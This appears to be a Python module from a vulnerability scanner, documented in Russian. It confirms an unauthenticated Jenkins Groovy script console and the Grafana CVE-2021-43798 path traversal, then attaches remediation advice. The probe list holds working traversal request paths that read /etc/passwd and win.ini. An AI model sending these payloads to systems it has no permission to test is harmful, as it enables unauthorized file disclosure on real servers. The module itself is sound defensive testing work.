"""Безопасное подтверждение эксплуатации — режим --pentest.

Этап 6 (``vulndb``) только сопоставляет версию компонента со списком CVE: это
подозрение «версия подпадает под диапазон», которое может быть снято патчем
дистрибутива или кастомной сборкой. Здесь для небольшого набора хорошо изученных
уязвимостей отправляется один дополнительный запрос, который доказывает, что
уязвимость действительно эксплуатируется на этой цели — без выполнения команд,
без изменения и без удаления данных:

* Jenkins: обращение к консоли Groovy-скриптов (``/script``) без авторизации.
  Сама доступность консоли и есть уязвимость — доказывать её, выполняя код,
  не нужно: любой код, который мог бы быть отправлен туда, выполнился бы с
  правами Jenkins, поэтому использование самой консоли не требуется.
* Grafana (CVE-2021-43798): path traversal в статике плагинов позволяет читать
  файлы с правами процесса Grafana. Проверяется чтение заведомо безвредного
  файла (/etc/passwd или windows\\win.ini) — так же, как это уже делает LFI-
  проверка в ``active.py``, только по известному для Grafana маршруту.

Список коротким не случайно: только проверки, где подтверждение не несёт риска
для сервиса. Для остальных найденных CVE отчёт остаётся на уровне «версия
уязвима по данным NVD/KEV» — это ответственное инженерное решение, а не
техническое ограничение.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Callable, List, Optional, Sequence
from urllib.parse import urljoin

from ..http_client import HttpClient
from ..models import CONFIRMED, HIGH, VULN, Finding
from ..utils import truncate

__all__ = ["run_cve_confirmation"]


@dataclass
class _Probe:
    label: str  # метка продукта, как в fingerprint.py (lower-case для сравнения)
    path: str
    kind: str
    title: str
    cve_hint: str  # для текста находки; не ограничивает запуск конкретным номером CVE
    check: Callable[[object], Optional[str]]  # response -> текст-подтверждение или None
    recommendation: str


def _jenkins_script_console(response) -> Optional[str]:
    if response.status_code != 200:
        return None
    body = _text(response).lower()
    if "loginform" in body or "j_username" in body:
        return None  # перенаправлено на форму входа — консоль закрыта
    if "groovy" in body and ("script console" in body or "evaluate groovy script" in body
                             or 'name="script"' in body):
        return "Страница консоли Groovy-скриптов отдана без авторизации (поле script, Groovy)."
    return None


def _grafana_traversal(response) -> Optional[str]:
    if response.status_code != 200:
        return None
    body = _text(response)
    lowered = body.lower()
    if "root:x:0:0" in lowered or "root:*:0:0" in lowered:
        return "В ответе — содержимое /etc/passwd (чтение файла через path traversal в плагине)."
    if "[fonts]" in lowered and "[extensions]" in lowered:
        return "В ответе — содержимое windows\\win.ini (чтение файла через path traversal в плагине)."
    return None


PROBES: Sequence[_Probe] = (
    _Probe(
        label="jenkins",
        path="/script",
        kind="cve_confirmed_jenkins_script_console",
        title="Подтверждено: консоль Groovy-скриптов Jenkins доступна без авторизации",
        cve_hint="CWE-306 / неограниченная консоль выполнения кода",
        check=_jenkins_script_console,
        recommendation="Включите авторизацию (Jenkins:Manage Jenkins → Security) и запретите "
                       "анонимный доступ к /script. Это полный эквивалент выполнения кода на "
                       "сервере с правами Jenkins — закрывать немедленно.",
    ),
    _Probe(
        label="grafana",
        path="/public/plugins/alertlist/../../../../../../../etc/passwd",
        kind="cve_confirmed_grafana_traversal",
        title="Подтверждено: CVE-2021-43798 — чтение файлов сервера через Grafana",
        cve_hint="CVE-2021-43798",
        check=_grafana_traversal,
        recommendation="Обновите Grafana до версии с исправлением CVE-2021-43798 "
                       "(8.0.7, 8.1.6, 8.2.7, 8.3.1 и новее). До обновления ограничьте доступ к "
                       "/public/plugins/ на уровне обратного прокси.",
    ),
    _Probe(
        label="grafana",
        path="/public/plugins/alertlist/../../../../../../../windows/win.ini",
        kind="cve_confirmed_grafana_traversal",
        title="Подтверждено: CVE-2021-43798 — чтение файлов сервера через Grafana",
        cve_hint="CVE-2021-43798",
        check=_grafana_traversal,
        recommendation="Обновите Grafana до версии с исправлением CVE-2021-43798 "
                       "(8.0.7, 8.1.6, 8.2.7, 8.3.1 и новее). До обновления ограничьте доступ к "
                       "/public/plugins/ на уровне обратного прокси.",
    ),
)


def run_cve_confirmation(client: HttpClient, components: Sequence, base_url: str,
                         reserve: int = 0) -> List[Finding]:
    """Для каждого обнаруженного компонента из ``PROBES`` отправляет одну безопасную пробу.

    ``components`` — список ``DetectedProduct`` (см. ``fingerprint.py``); проверка
    запускается независимо от того, нашёл ли этап 6 конкретный CVE в NVD — она
    опирается на собственное, более точное подтверждение.
    """
    findings: List[Finding] = []
    labels = {str(getattr(item, "label", "") or "").lower() for item in components}
    if not labels:
        return findings

    seen_kinds = set()
    for probe in PROBES:
        if probe.label not in labels or probe.kind in seen_kinds:
            continue
        if not client.can_request(reserve):
            break
        url = urljoin(base_url, probe.path)
        response = client.request("GET", url, allow_redirects=False, reserve=reserve)
        if response is None:
            continue
        evidence_text = probe.check(response)
        if not evidence_text:
            continue
        seen_kinds.add(probe.kind)
        findings.append(
            Finding(
                url=url,
                title=probe.title,
                kind=probe.kind,
                category=VULN,
                severity=HIGH,
                recommendation=probe.recommendation,
                request=f"GET {url}",
                evidence=truncate(
                    f"Идентификатор: {probe.cve_hint}\n"
                    f"Ответ HTTP/{response.status_code}\n{evidence_text}\n"
                    "Выполнена только проверка чтения — никакие данные не изменялись и не "
                    "удалялись.",
                    800,
                ),
                confidence=CONFIRMED,
                exploited=True,
            )
        )
    return findings


def _text(response) -> str:
    try:
        return response.text or ""
    except Exception:
        return ""
